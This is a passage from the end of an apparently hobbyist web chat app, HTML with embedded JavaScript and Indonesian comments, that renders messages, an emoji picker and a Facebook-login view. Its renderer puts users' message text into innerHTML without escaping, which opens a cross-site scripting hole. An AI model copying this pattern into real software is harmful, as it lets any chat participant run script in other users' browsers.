        };

        const renderChatView = () => {
            const messagesHtml = state.chatMessages
                .map(msg => {
                
                // PENTING: Menggunakan userId lokal untuk perbandingan
                const senderId = msg.userId || crypto.randomUUID(); 
                const isCurrentUser = userId !== null && senderId === userId; // Tambahkan cek null
                const isBot = senderId === 'SYSTEM_BOT'; // Bot selalu memiliki ID ini
                
                let positionClass;
                let senderColorStyle;
                let senderName;
                let messageExtraClass = ''; 
                const timeStamp = msg.timestamp ? new Date(msg.timestamp.seconds * 1000).toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit' }) : '??:??';


                if (isCurrentUser) {
                    // KASUS 1: PENGGUNA LOKAL (ANDA)
                    positionClass = 'justify-end';
                    senderName = 'ANDA';
                    senderColorStyle = 'style="color: #00FF00; text-shadow: 0 0 5px #00FF0030;"'; // Glow lebih lembut
                    messageExtraClass = 'chat-message-self'; 
                } else if (isBot) { 
                    // KASUS 2: BOT SISTEM
                    positionClass = 'justify-center'; // PENTING: Rata tengah
                    senderName = msg.sender; 
                    senderColorStyle = 'style="color: #A0A0A0; text-shadow: none;"'; 
                    messageExtraClass = 'bot-message-style'; 
                } else {
                    // KASUS 3: PENGGUNA LAIN
                    positionClass = 'justify-start';
                    senderName = msg.sender.toUpperCase();
                    
                    const colorHex = getUserColor(senderId); 
                    senderColorStyle = `style="color: ${colorHex}; text-shadow: 0 0 3px ${colorHex}30;"`; // Glow lebih lembut
                }
                
                let messageContent = '';
                let messageBody = '';
                
                // --- PENANGANAN PESAN BERKAS (FILE) - DIHAPUS/DISIMPLIFIKASI ---
                if (msg.messageType === 'file' && msg.fileName) {
                     // Karena fungsionalitas kirim file dihapus, kita akan menampilkan pesan ini sebagai teks biasa atau log
                     messageContent = `<span class="text-yellow-500 italic">[LOG FILE - Fungsionalitas Dihapus] ${msg.fileName}</span>`;
                     messageBody = `
                        <div class="flex flex-col w-full text-center">
                            <div class="text-sm sm:text-base bot-message-style">
                                ${messageContent}
                            </div>
                        </div>
                     `;
                } 
                // --- PENANGANAN PESAN CHAT BIASA (TERMASUK BOT) ---
                else {
                    const senderText = isBot ? '' : `<span class="font-bold mr-1 text-[0.8rem] sm:text-sm" ${senderColorStyle}>${senderName + ':'}</span>`;
                    
                    messageContent = isBot ? 
                        `<span class="text-gray-400 font-light">${msg.text}</span>` : 
                        `${senderText} <span class="text-white">${msg.text}</span>`;
                    
                    messageBody = isBot ? 
                        `
                        <div class="flex flex-col w-full text-center">
                            <div class="text-sm sm:text-base ${messageExtraClass}">
                                ${messageContent}
                            </div>
                        </div>
                        ` : 
                        `
                        <div class="flex flex-col max-w-[90%] sm:max-w-[75%]">
                            <div class="chat-message ${messageExtraClass}">
                                ${messageContent}
                            </div>
                            <span class="text-gray-500 message-timestamp mt-0.5 ${isCurrentUser ? 'self-end' : 'self-start'}">
                                ${timeStamp}
                            </span>
                        </div>
                        `;
                }


                return `
                    <div class="message-container ${positionClass}">
                        ${messageBody}
                    </div>
                `;
            }).join('');

            // PENGATURAN ALIGNMENT BARU UNTUK USER DAN ID ROOM
            const labelWidthClass = "min-w-[50px] sm:min-w-[60px]"; // Jauh lebih ramping
            const labelStyle = `${labelWidthClass} flex-shrink-0 text-blue-300 font-bold text-left`;
            const colonStyle = "w-1 text-blue-300 font-bold mr-1 flex-shrink-0"; 
            const valueStyle = "truncate text-blue-300 font-bold";
            const headerTextStyle = "header-font text-[0.65rem] sm:text-xs uppercase"; // Sangat kecil untuk mobile

            // --- STRUKTUR EMOJI PICKER BARU ---
            const emojiPickerHtml = `
                <div id="emoji-picker" class="absolute bottom-[100%] left-0 w-64 p-2 rounded-lg shadow-2xl z-20 hidden emoji-picker-container transition-all mb-1">
                    <div class="grid grid-cols-6 gap-1.5">
                        ${EMOJIS.map(emoji => `
                            <button class="emoji-item text-xl hover:bg-gray-700/50 p-1 rounded-sm transition-colors"
                                    onclick="selectEmoji('${emoji}')">
                                ${emoji}
                            </button>
                        `).join('')}
                    </div>
                </div>
            `;


            return `
                <!-- Main Wrapper: flex-grow flex flex-col h-full w-full -->
                <div class="flex-grow flex flex-col h-full w-full p-1 sm:p-2 max-w-5xl mx-auto">
                    
                    <!-- 1. HEADER (Fixed position - flex-shrink-0) -->
                    <div class="grid grid-cols-3 items-start bg-gray-900/40 p-1 sm:p-2 rounded-lg border border-primary-color/30 mb-2 sm:mb-3 flex-shrink-0">
                        
                        <!-- KOLOM 1 (KIRI): USERNAME & ID ROOM (ALIGNED) -->
                        <div class="flex flex-col truncate mr-1 ${headerTextStyle} justify-self-start">
                            
                            <!-- USERNAME LINE (Align Colon) -->
                            <div class="flex items-start leading-none">
                                <span class="${labelStyle}">USER</span>
                                <span class="${colonStyle}">:</span>
                                <span class="${valueStyle}">${state.username}</span>
                            </div>

                            <!-- ID ROOM LINE (Align Colon) -->
                            <div class="flex items-start leading-none">
                                <span class="${labelStyle}">ID ROOM</span>
                                <span class="${colonStyle}">:</span>
                                <span class="${valueStyle}">${state.roomId}</span>
                            </div>
                        </div>

                        <!-- KOLOM 2 (TENGAH): REAL-TIME CLOCK -->
                        <div id="real-time-clock" class="header-font text-center place-self-center mx-1 p-0.5 bg-gray-900/60 rounded-md border border-gray-800 shadow-inner">
                            <!-- Jam akan dimuat di sini oleh JS -->
                        </div>

                        <!-- KOLOM 3 (KANAN): TOMBOL LOGOUT -->
                        <div class="justify-self-end">
                            <button class="terminal-button text-[0.6rem] sm:text-xs bg-red-700 hover:bg-red-800 shadow-red-500/50 px-1.5 py-1" 
                                    onclick="handleLogout()" 
                                    ${state.isLoggingOut ? 'disabled' : ''}>
                                LOGOUT
                            </button>
                        </div>
                    </div>

                    <!-- Notifikasi Error/Status (Fixed position - flex-shrink-0) -->
                    ${state.error ? `<div class="bg-yellow-900 p-2 text-yellow-300 mb-2 border-yellow-700 border text-center text-xs sm:text-sm rounded-md flex-shrink-0">${state.error}</div>` : ''}

                    <!-- 2. SCROLLABLE CHAT LOG CONTAINER (flex-grow) -->
                    <div class="w-full flex flex-col flex-grow min-h-0 
                                p-1 sm:p-2 rounded-lg bg-gray-900/40 border border-[var(--primary-color)]/20 my-1 sm:my-2">
                        
                        <!-- Judul Chat Log (Fixed position inside this container - flex-shrink-0) -->
                        <h3 class="text-sm sm:text-base text-blue-400 mb-2 font-semibold glow-text text-center flex-shrink-0 border-b border-[var(--primary-color)]/30 pb-1">
                            STATUS : TERMINAL TERENKRIPSI
                        </h3>
                        
                        <!-- CHAT LOG (Scrollable content - flex-grow overflow-y-auto) -->
                        <div id="chat-log" class="flex-grow overflow-y-auto chat-log-container p-0 sm:p-1 scrollbar-futuristic"> 
                            <div class="text-gray-500 text-center mt-6 text-sm sm:text-base">
                                ${messagesHtml.length > 0 ? messagesHtml : '*** KONEKSI TERENKRIPSI. MENUNGGU PESAN... ***'}
                            </div>
                        </div>
                    </div>

                    <!-- 3. FOOTER (INPUT) (Fixed position - flex-shrink-0) -->
                    <div class="flex flex-col mt-2 flex-shrink-0 relative"> <!-- PENTING: RELATIVE untuk popover emoji -->
                        
                        ${emojiPickerHtml} <!-- Popover Emoji di sini -->

                        <div class="flex space-x-1 items-center">
                            
                            <!-- Tombol Emoji (Yellow, sekarang untuk toggle picker) -->
                            <button id="emoji-button" title="Pilih Emoji Standar"
                                    class="terminal-button text-xl sm:text-2xl p-1 sm:p-2 bg-yellow-600 hover:bg-yellow-700 shadow-yellow-500/50" 
                                    onclick="handleEmojiClick()" ${state.isLoggingOut ? 'disabled' : ''}>
                                &#x1F600; <!-- Emoji senyum standar -->
                            </button>
                            
                            <!-- Hapus Input File Tersembunyi -->

                            <!-- Hapus Tombol Upload File -->
                            
                            <input type="text" id="message-input" class="input-terminal flex-grow" placeholder="KETIK PESAN DI SINI..." onkeydown="if(event.key === 'Enter') handleSendMessage()" ${state.isLoggingOut ? 'disabled' : ''}>
                            <button class="terminal-button text-sm sm:text-base flex-shrink-0" onclick="handleSendMessage()" ${state.isLoggingOut ? 'disabled' : ''}>
                                KIRIM &gt;
                            </button>
                        </div>
                    </div>
                </div>
            `;
        };

        // --- Main Render Function ---
        
        // Expose global functions for HTML interaction
        window.updateState = updateState;
        window.handleUserJoin = handleUserJoin;
        window.handleSendMessage = handleSendMessage;
        window.handleLogout = handleLogout; 
        window.copyRoomId = copyRoomId;
        window.runDiagnostic = runDiagnostic; 
        window.forceLogout = forceLogout;
        window.handleGoToFacebookLogin = handleGoToFacebookLogin;
        window.handleFacebookLogin = handleFacebookLogin;
        window.handleEmojiClick = handleEmojiClick; 
        window.selectEmoji = selectEmoji; 
        
        const render = () => {
            const appDiv = document.getElementById('app');
            let content = '';

            stopClock(); 

            switch (state.currentView) {
                case 'chat':
                    content = renderChatView();
                    
                    updateClock(); 
                    clockInterval = setInterval(updateClock, 1000);

                    // Hapus pemanggilan setupFileListener
                    
                    setTimeout(scrollToBottom, 50); 
                    
                    setTimeout(() => {
                        const input = document.getElementById('message-input');
                        if (input && !state.isLoggingOut) {
                            input.focus();
                        }
                    }, 0); 
                    break;
                case 'facebook_login':
                    content = renderFacebookLoginView();
                    break;
                case 'main':
                default:
                    content = renderGuestSetupView();
                    
                    setTimeout(() => {
                        const guestInviteInput = document.getElementById('guest-invite-id');
                        // Fokus pada input terakhir saat view masuk
                        if (guestInviteInput) {
                            guestInviteInput.focus();
                        }
                    }, 0);
                    
                    break;
            }

            appDiv.innerHTML = content;
        };

        // Hapus function setupFileListener

        // Initialize Firebase when the window loads
        window.addEventListener('resize', setAppHeight);
        window.addEventListener('load', () => {
            setAppHeight(); 
            setupFirebase(); 
        });
        setAppHeight(); 

        render();

    </script>
</body>
</html>
